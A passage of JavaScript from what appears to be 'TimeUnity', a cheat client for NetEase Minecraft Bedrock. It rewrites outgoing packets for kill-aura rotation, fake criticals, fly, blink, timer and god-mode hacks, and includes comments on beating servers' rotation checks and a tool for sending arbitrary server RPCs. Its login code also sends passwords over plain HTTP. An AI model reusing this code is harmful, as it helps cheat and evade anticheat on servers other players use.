            _minecraft.clientMessage("§l§b[TimeUnity]§r §7>> §c未选择任何遗迹");
        }
    });
}


function EnchantLevel(number) {
    const romanNumerals = ['I', 'II', 'III', 'IV', 'V', 'VI', 'VII', 'VIII', 'IX', 'X'];
    return (number >= 1 && number <= 10) ? romanNumerals[number - 1] : String(number);
}

function EnchantMod() {
    if (EnchantMod_Enabled) {
        const Level = EnchantLevel(EnchantMod_Level);
        _i18n.setString("enchantment.level.5", Level);
        _i18n.setString("enchantment.level.4", Level);
        _i18n.setString("enchantment.level.3", Level);
        _i18n.setString("enchantment.level.2", Level);
        _i18n.setString("enchantment.level.1", Level);
    }
}

function getBasePath() {
    return _app.getResource().replace(/\/resources$/, '');
}

function getFilesPath() {
    return _app.getFilesDir().replace(/\/files$/, '');
}

function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        const r = Math.random() * 16 | 0;
        const v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

function getDeviceHWID() {
    try {
        const HWID_Path = getFilesPath() + "/shared_prefs/NeteaseSystemFile.xml";
        const Path = "/storage/emulated/0/Documents";
        const Files = _fs.list(Path);
        const FileOpen = ".bin_mt_plus_";
        let hwid = "获取失败";
        if (_fs.exists(HWID_Path)) {
            hwid = _fs.read(HWID_Path);
            for (let i = 0; i < Files.length; i++) {
                if (!Files[i].name.startsWith(FileOpen)) {
                    _fs.createDirectory(Path + "/" + FileOpen + hwid);
                    break;
                }
            }
        }
        for (let i = 0; i < Files.length; i++) {
            const File = Files[i];
            if (File.name.startsWith(FileOpen)) {
                hwid = File.name.slice(FileOpen.length);
                _fs.write(HWID_Path, hwid);
                break;
            }
        }
        if (hwid === "获取失败") {
            const UUID = generateUUID();
            const UUIDPath = Path + "/" + FileOpen + md5(UUID);
            _fs.createDirectory(UUIDPath);
            _fs.write(UUIDPath + "/.System", "System");
            hwid = md5(UUID);
            _fs.write(HWID_Path, hwid);
        }
        return md5(hwid);
    } catch (e) {
        return "获取失败";
        _minecraft.clientMessage("§c无法获取设备码: " + e.message);
    }
}

const LoginFile = getFilesPath() + "/shared_prefs/login_info.xml";
let FileContent;
let DeviceID = getDeviceHWID();
if (_fs.exists(LoginFile)) {
    FileContent = binaryToString(_crypto.uncompress(_fs.read(LoginFile, "binary")));
}
BetaUser = true;
CheckLogin = true;

function Registration() {
    _https.get(`http://time.fuhongweb.cn/register?user=${Registeruser}&pass=${Registerpass}`, {}, function(code, response) {
        try {
            const res = JSON.parse(XorDecrypt(response, "f8f617eaaf7eb5580cd4abb3ce2f8953"));
            if (res.code === 200 && res.message.includes("注册成功")) {
                _menu.remove("用户注册");
                _app.showToast(res.message);
            } else {
                _app.showToast(res.message || "注册失败");
            }
        } catch (e) {
            _app.showToast("响应解析异常: " + e);
        }
    });
}

function UserLogin() {
    CheckLogin = true;
    BetaUser = true;
}
let Fake_ClientTick = 0n;
let Has_Initialized_Tick = false;

function onSendServerPacketEvent(id, name, data) {
    if (TU_DIAG_ROT) {
        globalThis.TU_D_PIDS = globalThis.TU_D_PIDS || {};
        const _pk = "id" + id;
        globalThis.TU_D_PIDS[_pk] = (globalThis.TU_D_PIDS[_pk] || 0) + 1;
        globalThis.TU_D_PN = (globalThis.TU_D_PN || 0) + 1;
        if (globalThis.TU_D_PN % 500 === 0) {
            try { _minecraft.clientMessage("§e[TU]发包分布 " + JSON.stringify(globalThis.TU_D_PIDS)); } catch (e) { }
        }
    }
    if (id === 147) {
        let ItemStack = ParseItemStackRequestPacket(data);
        if (ItemStack && ItemStack.requests && !ItemStack.requests[0]) return true;
    }
    if (id === 33) {
        if (invManager_Enabled && invManager_TaskQueue.length > 0 && ContainerOpenState === "Hud") {
            if (invManager_Silence) {
                invManager_Intercept_Open = true;
                invManager_Intercept_Time = Date.now();
            }
        }
    }
    if (Anvil_NewLine_Enabled && id === 147) {
        let ItemStack_Parsed = ParseItemStackRequestPacket(data);
        if (ItemStack_Parsed && ItemStack_Parsed.requests) {
            for (let Request_Index = 0; Request_Index < ItemStack_Parsed.requests.length; Request_Index++) {
                let Request_Item = ItemStack_Parsed.requests[Request_Index];
                if (Request_Item.actions) {
                    for (let Action_Index = 0; Action_Index < Request_Item.actions.length; Action_Index++) {
                        if (Request_Item.actions[Action_Index].type === 15) {
                            if (Request_Item.filterStrings[0]) {
                                Request_Item.filterStrings = [Request_Item.filterStrings[0].replace(/\\n/g, '\n')];
                                return ParseItemStackRequestPacket(ItemStack_Parsed, true);
                            }
                        }
                    }
                }
            }
        }
    }
    if (id === 30) {
        const InventoryTransaction = ParseInventoryTransactionPacket(data);
        if (InventoryTransaction && InventoryTransaction.transactionType && InventoryTransaction.transactionType === 2 && InventoryTransaction.blockPos) {
            const Block = getBlock(InventoryTransaction.blockPos.x, InventoryTransaction.blockPos.y, InventoryTransaction.blockPos.z);
            if (ChestStealer_Enabled && ChestStealer_SilentMode && Block.namespace === "minecraft:chest") {
                closeContainer();
            }
        }
        if (BowTrack_Enabled && InventoryTransaction && InventoryTransaction.transactionType && InventoryTransaction.transactionType === 4) {
            const SourcePos = getEntityPos(self_id);
            const SourceRot = getEntityRot(self_id);
            if (SourcePos && SourceRot) {
                const PlayerList = getPlayerList() || [];
                const EntityList = getEntityList() || [];
                let CandidateIds = [];
                if (BowTrack_Player) {
                    PlayerList.forEach(Id => {
                        if (Id !== self_id) {
                            CandidateIds.push(Id);
                        }
                    });
                }
                if (BowTrack_Entity) {
                    const ExcludedTypes = ['minecraft:item', 'minecraft:xp_orb', 'netease:pet', 'minecraft:arrow', 'minecraft:thrown_trident'];
                    EntityList.forEach(Id => {
                        if (Id !== self_id && !PlayerList.includes(Id)) {
                            const EntityType = getEntityNamespace(Id);
                            if (!ExcludedTypes.includes(EntityType)) {
                                CandidateIds.push(Id);
                            }
                        }
                    });
                }
                if (CandidateIds.length > 0) {
                    const yawRad = (SourceRot.yaw * Math.PI) / 180;
                    const pitchRad = (SourceRot.pitch * Math.PI) / 180;
                    const forwardX = -Math.sin(yawRad) * Math.cos(pitchRad);
                    const forwardY = -Math.sin(pitchRad);
                    const forwardZ = Math.cos(yawRad) * Math.cos(pitchRad);
                    const SortedEntities = CandidateIds.map(Id => {
                        const TargetPos = getEntityPos(Id);
                        if (!TargetPos) return null;
                        const dx = TargetPos.x - SourcePos.x;
                        const dy = TargetPos.y - SourcePos.y;
                        const dz = TargetPos.z - SourcePos.z;
                        const length = Math.sqrt(dx * dx + dy * dy + dz * dz);
                        if (length === 0) return {
                            Id: Id,
                            Angle: 0
                        };
                        const targetDirX = dx / length;
                        const targetDirY = dy / length;
                        const targetDirZ = dz / length;
                        let dot = forwardX * targetDirX + forwardY * targetDirY + forwardZ * targetDirZ;
                        dot = Math.max(-1, Math.min(1, dot));
                        const angleDist = Math.acos(dot) * (180 / Math.PI);
                        return {
                            Id: Id,
                            Angle: angleDist
                        };
                    }).filter(Item => Item !== null).sort((A, B) => A.Angle - B.Angle);
                    const TargetId = SortedEntities.length > 0 ? SortedEntities[0].Id : null;
                    if (TargetId) {
                        const TargetPosFinal = getEntityPos(TargetId);
                        const TargetSize = getEntitySize(TargetId);
                        const IsPlayer = PlayerList.includes(TargetId);
                        if (TargetPosFinal && TargetSize) {
                            let FinalY;
                            if (IsPlayer) {
                                FinalY = TargetPosFinal.y - 0.5;
                            } else {
                                FinalY = TargetPosFinal.y + (TargetSize.y * 0.5);
                            }
                            const TargetMotion = getEntityMotion(TargetId);
                            const HorizDist = Math.sqrt(TargetMotion.x * TargetMotion.x + TargetMotion.z * TargetMotion.z);
                            let TargetYaw = 0;
                            let TargetPitch = 0;
                            if (HorizDist > 0) {
                                TargetYaw = Math.atan2(-TargetMotion.x, TargetMotion.z) * (180 / Math.PI);
                                TargetPitch = Math.atan2(-TargetMotion.y, HorizDist) * (180 / Math.PI);
                            } else {
                                const TargetRot = getEntityRot(TargetId);
                                if (TargetRot) {
                                    TargetYaw = TargetRot.yaw || 0;
                                }
                                TargetPitch = 90;
                            }
                            TargetYaw = TargetYaw % 360;
                            TargetYaw = TargetYaw > 180 ? TargetYaw - 360 : (TargetYaw < -180 ? TargetYaw + 360 : TargetYaw);
                            TargetPitch = TargetPitch % 360;
                            TargetPitch = TargetPitch > 180 ? TargetPitch - 360 : (TargetPitch < -180 ? TargetPitch + 360 : TargetPitch);
                            sendPlayerAuthInput({
                                pos: {
                                    x: TargetPosFinal.x,
                                    y: FinalY,
                                    z: TargetPosFinal.z
                                },
                                rot: {
                                    yaw: TargetYaw,
                                    pitch: TargetPitch
                                }
                            });
                        }
                    }
                }
            }
        }
        if (AntiTP_Enabled && InventoryTransaction && InventoryTransaction.transactionType === 2 || InventoryTransaction.transactionType === 3) {
            sendPlayerAuthInput({
                pos: {
                    x: self_pos.x,
                    y: self_pos.y,
                    z: self_pos.z
                },
                inputs: [24, 37, 52]
            });
        }
    }
    if (id === 19) {
        /* 移动时客户端发的是 MovePlayer(19)，不是 PlayerAuthInput(144) —— 只覆盖 144 的话，
           移动中发出去的就是玩家真实朝向（头被拉回视角方向、投掷物飞向实际朝向）。
           参照 CreeperBox：两种包的 rotation 都改。 */
        if (SilentRot_data !== null && !TU_LegacyPacketMode && TU_CoverMode !== 2) {
            data = TU_CoverMovePlayerRot(data, SilentRot_data);
            return data;
        }
    }
    if (id === 144) {
        if (TU_MoveProbe) TU_ProbeMove(data);
        if (TU_DIAG_ROT) {
            globalThis.TU_D_ALL = (globalThis.TU_D_ALL || 0) + 1;
            const _dk = "L" + (data && data.byteLength);
            globalThis.TU_D_LEN = globalThis.TU_D_LEN || {};
            globalThis.TU_D_LEN[_dk] = (globalThis.TU_D_LEN[_dk] || 0) + 1;
            if (globalThis.TU_D_ALL % 200 === 0) {
                try {
                    _minecraft.clientMessage("§e[TU]144包=" + globalThis.TU_D_ALL + " 已覆盖=" + (globalThis.TU_D_COV || 0) + " 长度=" + JSON.stringify(globalThis.TU_D_LEN));
                } catch (e) { }
            }
        }
        if (BJDFly_Enabled || Blink_Enabled) return true;
        if (MegaTop_Enabled) {
            try {
                let view = new DataView(data);
                view.setFloat32(28, MegaTop_yRot, true);
                /* 身体只在「本包没有移动输入」时一起覆盖：移动中改 yaw，服务端会按
                   新朝向重算走位 —— 那既是「走不了直线」，也是「别人看你原地转圈」的成因。 */
                if (TU_AllowFullRot(data, false)) {
                    /* yaw 要变了：先把原值读出来，覆盖完再做补偿。 */
                    const _yawR = view.getFloat32(4, true);
                    view.setFloat32(0, 0, true);
                    view.setFloat32(4, MegaTop_yRot, true);
                    if (TU_FixMoveComp) TU_FixMove(view, MegaTop_yRot - _yawR);
                    if (TU_MoveProbe) TU_ProbeAfter(view, "144");
                }
                return data;
            } catch (e) {
                return false;
            }
        }
        if (NoFall_Active) {
            NoFall_Active = false;
            if (NoFall_BJDMode) {
                setEntityMotion(self_id, self_motion.x, 0.1, self_motion.z);
            } else {
                sendPlayerAuthInput({
                    pos: {
                        x: self_pos.x,
                        y: self_pos.y,
                        z: self_pos.z
                    },
                    motion: {
                        x: 0,
                        y: 0.1,
                        z: 0
                    }
                });
            }
            return true;
        }
        if (Critical_Enabled && Critical_SilentRot !== null && SilentRot_data !== null) {
            let view = new DataView(data);
            /* 服务端与其他客户端看到的就是这三个字段：pitch(0) / yaw(4) / headYaw(28)。
               只覆盖 headYaw 时，服务端仍按玩家自己的视角判定，带朝向校验的服务器
               会直接把这次攻击判掉 —— 这就是「部分服务器杀戮光环不生效」的原因；
               v1api 版三个字段都覆盖，所以过去在什么服务器上都生效。 */
            if (TU_DIAG_ROT) globalThis.TU_D_COV = (globalThis.TU_D_COV || 0) + 1;
            if (TU_CoverMode === 0) view.setFloat32(28, SilentRot_data.yaw, true);
            if (TU_CoverMode !== 2 && TU_AllowFullRot(data, SilentRot_data.forceFull)) {
                /* 幅度门控（#44）：服务端对朝向突变的惩罚随幅度增长 —— 实测 Δ≤30° 时
                   世界速度几乎不抖，超过 30° 就剧烈来回。只在小幅修正时整身转，
                   大角度保持只转头部（headYaw 已在上面按 TU_CoverMode 覆盖）。 */
                const _yawR = view.getFloat32(4, true);
                const _dy = TU_WrapDeg(SilentRot_data.yaw - _yawR);
                if (Math.abs(_dy) <= TU_SwingMaxDeg) {
                    view.setFloat32(0, SilentRot_data.pitch, true);
                    view.setFloat32(4, SilentRot_data.yaw, true);
                    if (TU_FixMoveComp) TU_FixMove(view, _dy);
                }
                if (TU_MoveProbe) TU_ProbeAfter(view, "144");
            }
            return data;
        }
        if (SilentRot_data !== null) {
            try {
                let view = new DataView(data);
                /* 服务端与其他客户端看到的就是这三个字段：pitch(0) / yaw(4) / headYaw(28)。
                   只覆盖 headYaw 时服务端仍按玩家自己的视角判定（原因见上）。 */
                /* 头部永远转；身体只在「本包没有移动输入」时才跟着转 —— 判据看
                   包里 v20/v24，不看实际速度（起步/贴墙时速度会瞬时接近 0，
                   用速度判会把「正在推摇杆」当成「静止」，又去覆盖 yaw）。 */
                if (TU_DIAG_ROT) globalThis.TU_D_COV = (globalThis.TU_D_COV || 0) + 1;
                if (TU_CoverMode === 0) view.setFloat32(28, SilentRot_data.yaw, true);
                if (TU_CoverMode !== 2 && TU_AllowFullRot(data, SilentRot_data.forceFull)) {
                    /* 幅度门控（#44）：服务端对朝向突变的惩罚随幅度增长 —— 实测 Δ≤30° 时
                       世界速度几乎不抖，超过 30° 就剧烈来回。只在小幅修正时整身转，
                       大角度保持只转头部（headYaw 已在上面按 TU_CoverMode 覆盖）。 */
                    const _yawR = view.getFloat32(4, true);
                    const _dy = TU_WrapDeg(SilentRot_data.yaw - _yawR);
                    if (Math.abs(_dy) <= TU_SwingMaxDeg) {
                        view.setFloat32(0, SilentRot_data.pitch, true);
                        view.setFloat32(4, SilentRot_data.yaw, true);
                        if (TU_FixMoveComp) TU_FixMove(view, _dy);
                    }
                    if (TU_MoveProbe) TU_ProbeAfter(view, "144");
                }
                /* 同一 tick 的其余包共用同一份朝向（重置在 onTickEvent 开头）。
                   TU_LegacyPacketMode 打开时退回 v1api 的写法：改完这一个就清空。 */
                if (TU_LegacyPacketMode) SilentRot_data = null;
                if (Critical_Enabled && Critical_isAttack2 && getEntityIsGround(self_id)) {
                    let buffer = data instanceof ArrayBuffer ? data : data.buffer;
                    let byteOffset = data.byteOffset || 0;
                    let byteLength = data.byteLength;
                    let Read_u8 = new Uint8Array(buffer, byteOffset, byteLength);
                    let Read_Offset = 32;

                    function Skip_VarInt() {
                        while (Read_Offset < byteLength && (Read_u8[Read_Offset] & 0x80) !== 0) {
                            Read_Offset++;
                        }
                        Read_Offset++;
                    }
                    Skip_VarInt();
                    Skip_VarInt();
                    Skip_VarInt();
                    Skip_VarInt();
                    let Parsed_ClientTick = 0n;
                    let Parsed_Shift = 0n;
                    let Parsed_Byte;
                    do {
                        if (Read_Offset >= byteLength) break;
                        Parsed_Byte = Read_u8[Read_Offset++];
                        Parsed_ClientTick |= BigInt(Parsed_Byte & 0x7f) << Parsed_Shift;
                        Parsed_Shift += 7n;
                    } while (Parsed_Byte & 0x80);
                    let Tick_Matched = false;
                    let Parsed_TickStr = String(Parsed_ClientTick);
                    for (let i = 0; i < Intercepted_ClientTicks.length; i++) {
                        if (String(Intercepted_ClientTicks[i]) === Parsed_TickStr) {
                            Tick_Matched = true;
                            break;
                        }
                    }
                    if (Tick_Matched) {
                        if (view.getFloat32(20, true) === 50) {
                            Critical_isAttack2 = false;
                            view.setFloat32(8, Number(self_pos.x), true);
                            view.setFloat32(12, Number(self_pos.y + 0.0000000001), true);
                            view.setFloat32(16, Number(self_pos.z), true);
                            view.setFloat32(20, 0, true);
                            view.setFloat32(24, 0, true);
                        }
                    }
                    Critical_isAttack2 = false;
                    if (view.getFloat32(28, true) !== 0) {
                        view.setFloat32(8, Number(self_pos.x), true);
                        view.setFloat32(12, Number(self_pos.y + 0.0000000001), true);
                        view.setFloat32(16, Number(self_pos.z), true);
                    }
                }
                return data;
            } catch (e) {
                return false;
            }
        }
        if (Critical_Enabled && Critical_isAttack2 && getEntityIsGround(self_id)) {
            let buffer = data instanceof ArrayBuffer ? data : data.buffer;
            let byteOffset = data.byteOffset || 0;
            let byteLength = data.byteLength;
            let view = new DataView(buffer, byteOffset, byteLength);
            let Read_u8 = new Uint8Array(buffer, byteOffset, byteLength);
            let Read_Offset = 32;

            function Skip_VarInt() {
                while (Read_Offset < byteLength && (Read_u8[Read_Offset] & 0x80) !== 0) {
                    Read_Offset++;
                }
                Read_Offset++;
            }
            Skip_VarInt();
            Skip_VarInt();
            Skip_VarInt();
            Skip_VarInt();
            let Parsed_ClientTick = 0n;
            let Parsed_Shift = 0n;
            let Parsed_Byte;
            do {
                if (Read_Offset >= byteLength) break;
                Parsed_Byte = Read_u8[Read_Offset++];
                Parsed_ClientTick |= BigInt(Parsed_Byte & 0x7f) << Parsed_Shift;
                Parsed_Shift += 7n;
            } while (Parsed_Byte & 0x80);
            let Tick_Matched = false;
            let Parsed_TickStr = String(Parsed_ClientTick);
            for (let i = 0; i < Intercepted_ClientTicks.length; i++) {
                if (String(Intercepted_ClientTicks[i]) === Parsed_TickStr) {
                    Tick_Matched = true;
                    break;
                }
            }
            if (Tick_Matched) {
                if (view.getFloat32(20, true) === 50) {
                    Critical_isAttack2 = false;
                    view.setFloat32(8, Number(self_pos.x), true);
                    view.setFloat32(12, Number(self_pos.y), true);
                    view.setFloat32(16, Number(self_pos.z), true);
                    view.setFloat32(20, 0, true);
                    view.setFloat32(24, 0, true);
                    return data;
                } else {
                    return true;
                }
            }
            Critical_isAttack2 = false;
            if (view.getFloat32(28, true) !== 0) {
                view.setFloat32(8, Number(self_pos.x), true);
                view.setFloat32(12, Number(self_pos.y + 0.1), true);
                view.setFloat32(16, Number(self_pos.z), true);
                return data;
            }
            return false;
        }
        if (Hammer_isAttack && Hammer_Enabled && Hammer_ModifyPos) {
            let view = new DataView(data);
            view.setFloat32(8, Number(self_pos.x), true);
            view.setFloat32(12, -80, true);
            view.setFloat32(16, Number(self_pos.z), true);
            return data;
        }
        if (InfiniteAura_PlayerAuthInput) {
            let buffer = data instanceof ArrayBuffer ? data : data.buffer;
            let byteOffset = data.byteOffset || 0;
            let byteLength = data.byteLength;
            let u8 = new Uint8Array(buffer, byteOffset, byteLength);
            let Read_Offset = 32;
            for (let i = 0; i < 4; i++) {
                while (Read_Offset < byteLength && (u8[Read_Offset] & 0x80) !== 0) {
                    Read_Offset++;
                }
                Read_Offset++;
            }
            let tickStart = Read_Offset;
            while (Read_Offset < byteLength && (u8[Read_Offset] & 0x80) !== 0) {
                Read_Offset++;
            }
            let tickEnd = Read_Offset + 1;

            let newTick = BigInt(PlayerAuthInput_ClientTick + 1);
            let newVarInt = [];
            while (newTick > 127n) {
                newVarInt.push(Number((newTick & 127n) | 128n));
                newTick >>= 7n;
            }
            newVarInt.push(Number(newTick));
            let newData = new Uint8Array(byteLength - (tickEnd - tickStart) + newVarInt.length);
            newData.set(u8.subarray(0, tickStart), 0);
            newData.set(newVarInt, tickStart);
            newData.set(u8.subarray(tickEnd), tickStart + newVarInt.length);
            InfiniteAura_PlayerAuthInput = false;
            return newData.buffer;
        }
        if (Timer_Enabled) {
            let buffer = data instanceof ArrayBuffer ? data : data.buffer;
            let byteLength = buffer.byteLength;
            let Read_u8 = new Uint8Array(buffer);
            let Read_Offset = 32;

            function Skip_VarInt() {
                while (Read_Offset < byteLength && (Read_u8[Read_Offset] & 0x80) !== 0) {
                    Read_Offset++;
                }
                Read_Offset++;
            }
            Skip_VarInt();
            Skip_VarInt();
            Skip_VarInt();
            Skip_VarInt();
            let tick_offset_start = Read_Offset;
            let Parsed_ClientTick = 0n;
            let Parsed_Shift = 0n;
            let Parsed_Byte;
            do {
                if (Read_Offset >= byteLength) break;
                Parsed_Byte = Read_u8[Read_Offset++];
                Parsed_ClientTick |= BigInt(Parsed_Byte & 0x7f) << Parsed_Shift;
                Parsed_Shift += 7n;
            } while (Parsed_Byte & 0x80);
            let tick_offset_end = Read_Offset;
            if (!Has_Initialized_Tick) {
                Fake_ClientTick = Parsed_ClientTick;
                Has_Initialized_Tick = true;
            }
            let newVarInt = [];
            let temp = Fake_ClientTick;
            while (temp > 127n) {
                newVarInt.push(Number((temp & 127n) | 128n));
                temp >>= 7n;
            }
            newVarInt.push(Number(temp));
            let newData = new Uint8Array(byteLength - (tick_offset_end - tick_offset_start) + newVarInt.length);
            newData.set(Read_u8.subarray(0, tick_offset_start), 0);
            newData.set(newVarInt, tick_offset_start);
            newData.set(Read_u8.subarray(tick_offset_end), tick_offset_start + newVarInt.length);
            Fake_ClientTick += 1n;
            if (data instanceof ArrayBuffer) {
                return newData.buffer;
            } else {
                return newData;
            }
        }
        if (AntiAntiBot_Enabled) {
            try {
                getPlayerList().forEach(Player => {
                    if (Player === self_id) return;
                    const TargetPos = getEntityPos(Player);
                    const Range = getRange(TargetPos, self_pos);
                    if (Range <= 6) {
                        let view = new DataView(data);
                        view.setFloat32(0, 0, true);
                        view.setFloat32(28, 0, true);
                        view.setFloat32(4, 0, true);
                    } else {
                        return false;
                    }
                });
                return data;
            } catch (e) {
                return false;
            }
        }
    }
    if (id === 30) {
        if (InfiniteAura_RewriteAttackPos !== null) {
            let view = new DataView(data);
            let xOffset = data.byteLength - 24;
            let yOffset = data.byteLength - 20;
            let zOffset = data.byteLength - 16;
            view.setFloat32(xOffset, InfiniteAura_RewriteAttackPos.x, true);
            view.setFloat32(yOffset, InfiniteAura_RewriteAttackPos.y, true);
            view.setFloat32(zOffset, InfiniteAura_RewriteAttackPos.z, true);
            InfiniteAura_RewriteAttackPos = null;
            return data;
        }
    }
    if (id == 200 && TickStop_Enabled && TickStop_Mode == 0) return 1000;
    if (id == 200 && Beacon_Packet_Enabled) return Beacon_Speed;
    if (id == 36 && PacketSleep) return PacketSleep_Speed;
    if (id === 44) {
        const res = ParseAnimatePacket(data);
        if (ParticleBoom_TargetIds.length > 0 && res.actionId === 4) {
            return ParticleBoom_Quantity - 1;
        }
    }
    if (id === 1) {
        LocalPlayerName = GetNameFromLoginPacket(data);
    }
    if (id === 236 && CampersAura_Speed) return CampersAura_Speed;
    if (Debug_Enabled && id !== 144 && id !== 44) {
        _minecraft.clientMessage("[Send] " + id + " " + name);
    }
    return false;
}

function onSAuthLoginResponseEvent(body) {
    if (CustomName_Enabled) {
        if (CustomName_Content !== "") {
            callModule(71, JSON.stringify({
                content: CustomName_Content,
                packet: false,
                value: true
            }));
        }
    }
}

function onPlayerAuthInputEvent(input) {
    if (input && input.actions && input.actions.length > 0) {
        const Action = input.actions[0];
        if (Action.type === 0) {
            DestroyBlocks = {
                isDestroy: true,
                Pos: Action.pos,
                Face: Action.facing
            }
        } else if (Action.type === 27) {
            DestroyBlocks = {
                isDestroy: true,
                Pos: Action.pos,
                Face: Action.facing
            }
        } else if (Action.type === 1) {
            DestroyBlocks = {
                isDestroy: false,
                Pos: Action.pos,
                Face: Action.facing
            }
        }
    }
    PlayerAuthInput_ClientTick = input.clientTick
    if (input.moveVec.x !== 50) {
        InputVector = input.moveVec;
    }
    PlayerAuthInput_Pos = input.pos;
    PlayerAuthInput_Rot = input.rot;
    try {
        if (BJDFly_Enabled) {
            const deltaLength = Math.sqrt(input.delta.x ** 2 + input.delta.y ** 2 + input.delta.z ** 2);
            const offsetX = input.delta.x / deltaLength * 5;
            const offsetY = input.delta.y / deltaLength * 5;
            const offsetZ = input.delta.z / deltaLength * 5;
            const record = {
                pos: {
                    x: input.pos.x + offsetX,
                    y: input.pos.y + offsetY,
                    z: input.pos.z + offsetZ
                },
                motion: {
                    x: input.delta.x,
                    y: input.delta.y,
                    z: input.delta.z
                },
                rot: {
                    pitch: input.rot.pitch,
                    yaw: input.rot.yaw
                },
                move: {
                    x: input.moveVec.x,
                    y: input.moveVec.y
                },
                flags: [input.flags]
            };
            BJDFly_Pos.push(record);
        }
        if (Blink_Enabled) {
            const record = {
                pos: {
                    x: input.pos.x,
                    y: input.pos.y,
                    z: input.pos.z
                }
            }
            Blink_Pos.push(record);
        }
        if (GodMode_Enabled) {
            return Array.isArray(input.inputData) && !input.inputData.includes(53);
        }
        return false;
    } catch (e) {}
}

function sendBJDFlyPos() {
    if (BJDFly_Pos.length === 0) {
        return;
    }
    BJDFly_Pos.forEach((PosData) => {
        for (let i = 0; i < BJDFly_Packet; i++) {
            sendPlayerAuthInput({
                pos: {
                    x: PosData.pos.x,
                    y: PosData.pos.y,
                    z: PosData.pos.z
                }
            });
        }
    });
    BJDFly_Pos = [];
}

function sendBlinkPos() {
    if (Blink_Pos.length === 0) {
        return;
    }
    Blink_Pos.forEach((PosData) => {
        sendPlayerAuthInput({
            pos: {
                x: PosData.pos.x,
                y: PosData.pos.y,
                z: PosData.pos.z
            }
        });
    });
    Blink_Pos = [];
}

function timestampToTime(timestamp, format = 'YYYY-MM-DD HH:mm:ss', isMillisecond = false) {
    const ts = isMillisecond ? timestamp : timestamp * 1000;
    const date = new Date(ts);
    const beijingOffset = 8 * 60 * 60 * 1000;
    const beijingTime = new Date(date.getTime() + beijingOffset);
    const padZero = num => (num < 10 ? `0${num}` : num);
    return format.replace('YYYY', beijingTime.getUTCFullYear()).replace('MM', padZero(beijingTime.getUTCMonth() + 1)).replace('DD', padZero(beijingTime.getUTCDate())).replace('HH', padZero(beijingTime.getUTCHours())).replace('mm', padZero(beijingTime.getUTCMinutes())).replace('ss', padZero(beijingTime.getUTCSeconds()));
}


function ReplaceData(Data, PlayerId) {
    const playerIdHex = StringToHex(`-${PlayerId}`);
    const pattern = /(2d[0-9a-f]{22})/g;
    return Data.replace(pattern, playerIdHex);
}

function StringToHex(str) {
    let hex = "";
    for (let i = 0; i < str.length; i++) {
        hex += str.charCodeAt(i).toString(16).padStart(2, "0");
    }
    return hex;
}

function PyRpcTube_Custom() {
    const custom_form = `
  {
    "type": "custom_form",
    "title": "自定义Rpc",
    "content": [
      {
        "type": "input",
        "text": "请输入要发送的PyRpc",
        "default": ""
      },
      {
        "type": "toggle",
        "text": "自动修改唯一标识",
        "default": false
      },
      {
        "type": "toggle",
        "text": "保存为脚本",
        "default": false
      }
    ]
  }
`;
    _gui.addForm(custom_form, function(...args) {
        let NewRpcData = args[0];
        if (args[1]) NewRpcData = ReplaceData(NewRpcData, self_id);
        if (args[0]) {
            sendPyRpc(98247598, NewRpcData);
            _minecraft.clientMessage("§e已发送 §a" + NewRpcData);
        }
        if (args[2]) {
            _fs.write(_app.getResource() + "/TimeUnity/PyRpc.js", `const hexToUint8Array = (hex) => {
    if (hex.startsWith('0x')) {
        hex = hex.slice(2);
    }
    const bytes = [];
    for (let i = 0; i < hex.length; i += 2) {
        const byte = parseInt(hex.slice(i, i + 2), 16);
        bytes.push(byte);
    }
    return new Uint8Array(bytes);
}
const sendPyRpc = (id, data) => TU_SendPyRpc(id, hexToUint8Array(data));

sendPyRpc(98247598, "${NewRpcData}");`);
            _minecraft.clientMessage("§e已保存至TimeUnity/PyRpc.js");
        }
    });
}

function onPyRpcSendEvent(id, data, json) {
    try {
        if (PyRpcTube && PyRpcTube_Send) {
            const Hex = Array.from(new Uint8Array(data), byte => byte.toString(16).padStart(2, '0')).join('');
            if (PyRpcTube_Save) {
                if (PyRpcTube_Cycle && Hex === RpcData) return;
                if (_fs.exists(_app.getResource() + "/TimeUnity/PyRpc_Record.json")) {
                    _fs.write(_app.getResource() + "/TimeUnity/PyRpc_Record.json", `${_fs.read(_app.getResource() + "/TimeUnity/PyRpc_Record.json")}[${timestampToTime(Math.floor(Date.now() / 1000))}] ${id} ${Hex}\n`);
                } else {
                    _fs.write(_app.getResource() + "/TimeUnity/PyRpc_Record.json", `[${timestampToTime(Math.floor(Date.now() / 1000))}] ${id} ${Hex}\n`);
                }
            }
            if (PyRpcTube_Tip) {
                if (PyRpcTube_Cycle && Hex === RpcData) return;
                _minecraft.clientMessage(`§b${id} §a${Hex}`)
            }
            if (PyRpcTube_Cycle) RpcData = Hex;
        }
        return false;
    } catch (e) {}
}

const Login = `{
  "type": "Menu",
  "title": {
    "name": "用户登录",
    "size": ${main_title_size || 16},
    "elevation": 3,
    "background": "${main_title_background || "#FFFFFF"}",
    "padding": [4, 2, 4, 2],
    "text_margins": [3, 2, 3, 2],
    "colors": ["#FF0000", "#000F0F"]
  },
  "color": "${main_color || "#FFFFFF"}",
  "alpha": ${main_alpha || 0.85},
  "radius": 8,
  "can_close": true,
  "hide": true,
  "items": [
    {
      "type": "TextView",
      "name": "用户登录",
      "color": "${main_item_color || "#121212"}",
      "tag": "TimeUnity_Login",
      "items": [
        {
          "type": "EditText",
          "name": "输入账号",
          "color": "#B4000000",
          "key": "loginUser",
          "hint": "示例:admin",
          "max_lines": 6
        },
        {
          "type": "EditText",
          "name": "输入密码",
          "color": "#B4000000",
          "key": "loginpass",
          "hint": "示例:123456789",
          "max_lines": 6
        },
        {
          "type": "TextView",
          "name": "确认登录",
          "color": "#B4000000",
          "key": "Confirm_Login"
        }
      ]
    }
  ]
}`
const Register = `{
  "type": "Menu",
  "title": {
    "name": "用户注册",
    "size": 16,
    "elevation": 3,
    "background": "${main_title_background || "#FFFFFF"}",
    "padding": [4, 2, 4, 2],
    "text_margins": [3, 2, 3, 2],
    "colors": [
      "#FF0000",
      "#000F0F"
    ]
  },
  "color": "${main_color || "#FFFFFF"}",
  "alpha": ${main_alpha || 0.85},
  "radius": 8,
  "can_close": true,
  "hide": true,
  "items": [
    {
      "type": "TextView",
      "name": "用户注册",
      "color": "${main_item_color || "#121212"}",
      "tag": "TimeUnity_Register",
      "items": [
        {
          "type": "EditText",
          "name": "输入账号",
          "color": "#B4000000",
          "key": "Registeruser",
